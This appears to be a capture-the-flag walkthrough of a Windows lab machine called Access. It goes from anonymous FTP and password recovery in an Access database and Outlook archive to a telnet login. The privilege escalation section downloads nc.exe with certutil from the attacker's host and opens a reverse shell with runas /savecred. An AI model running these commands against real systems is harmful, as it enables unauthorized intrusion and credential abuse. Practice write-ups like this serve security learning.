
![[access logo.png]]

# Summary

- [Enumeration](#enumeration)
	- [Nmap scan](#nmap-scan)
	- [FTP server](#ftp-server)
- [MDB File](#mdb-file)
- [Shell as security user](#shell-as-security-user)
- [Privilege Escalation](#privilege-escalation)

--- 
# Enumeration

### Nmap scan

```
nmap -sVC 10.129.63.24 -oN scan.txt
```

```
<SNIP>

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-ntlm-info:
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

<SNIP>
```

### FTP server

We can access the **ftp server** as anonymous so let's access it.

```
ftp 10.129.63.24
anonymous:whatever
```

![Pasted image 20260131140215](Images/Pasted%20image%2020260131140215.png)

I found a file `backup.mdb` under the `Backup` Directory

```
ftp> ls
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-23-18  08:16PM       <DIR>          Backups
08-24-18  09:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> cd Backups
250 CWD command successful.
ftp> ls
200 EPRT command successful.
150 Opening ASCII mode data connection.
08-23-18  08:16PM              5652480 backup.mdb
226 Transfer complete.
```

I couldn't transfer the file in **ASCII** format because the output would always be corrupted. So i had to specify the binary mode.

```
ftp> binary
200 Type set to I.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 EPRT command successful.
150 Opening BINARY mode data connection.
100% |***************************************************************************|  5520 KiB    2.52 MiB/s    00:00 ETA
226 Transfer complete.
5652480 bytes received in 00:02 (2.49 MiB/s)
```

I found another file under the `Security` directory called **"Access Control.zip"** so i downloaded it too.

```
ftp> get Access\ Control.zip
local: Access Control.zip remote: Access Control.zip
200 EPRT command successful.
150 Opening BINARY mode data connection.
100% |***************************************************************************| 10870      120.30 KiB/s    00:00 ETA
226 Transfer complete.
10870 bytes received in 00:00 (78.11 KiB/s)
```

# MDB File

I couldn't unzip the `.zip` file because i needed a password so worked on the `backup.mdb` file.

The extension `.mdb` means it's a **Microsoft Access Database**. To enumerate the database i used the `mdp-tools` suite.

```
mdb-tables backup.mdb
```

![Pasted image 20260131141331](Images/Pasted%20image%2020260131141331.png)

There is several table inside the database but `auth_serv` looks interesting so i dumped it.

```
mdb-export backup.mdb auth_user
```

![Pasted image 20260131141610](Images/Pasted%20image%2020260131141610.png)

I found several entry containing credentials. I tried all of them for `telnet` authentication but none of them worked.

# Shell as security user

I tried the passwords for the `.zip` and the password `access4u@security` worked so i cound unzip it's content.

```
7z x "Access Control.zip" -p"access4u@security"
```

The file `Access Control.pst` was extracted. The exstension indicate that it's an **Outlook Personnal Storage** so it might contains some interesting emails.

To read it i used the tool `readpst`

```
readpst "Access Control.pst"
```

And the file **Access Control.mbox** got extracted.

```
cat "Access Control.mbox"
```

![Pasted image 20260131142210](Images/Pasted%20image%2020260131142210.png)

It's an email containing the credentials for the user `security`. So we got the following credentials :

- **User** : `security`
- **Password** : `4Cc3ssC0ntr0ller`

Let's try them on telnet

```
# telnet 10.129.63.24

Trying 10.129.63.24...
Connected to 10.129.63.24.
Escape character is '^]'.
Welcome to Microsoft Telnet Service

login: security
password: 4Cc3ssC0ntr0ller

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>
```

It worked, we got a shell as the user `security`.

# Privilege Escalation 

Now it's time to find a way to escalate our privilege

```
whoami /priv
```

![Pasted image 20260131134625](Images/Pasted%20image%2020260131134625.png)

Nothing interessting

```
cmdkey /list
```

![Pasted image 20260131134913](Images/Pasted%20image%2020260131134913.png)

Ok we got the credentials for Administrator stored on the account `security`.
That means that we can run command as administrator and take over the target.

First we have to transfert `nc.exe` to our target.

We start a `python3` web server inside the directory where `nc.exe` is on our attacking machine.

```
python3 -m http.server 80
```

Then we transfer the file to the target

```
certutil.exe -urlcache -f http://10.10.16.194/nc.exe nc.exe
```

Once the file is on the target, we start a listener on our machine.

```
nc -lvnp 443
```

And we use the following command to get a reverse shell as `Administrator`.

```
runas /savecred /user:Administrator "C:\Users\security\Desktop\nc.exe -e cmd.exe 10.10.16.194 443"
```

![Pasted image 20260131135501](Images/Pasted%20image%2020260131135501.png)

And we can grab the root flag under `C:\Users\Administrator\Desktop\root.txt`.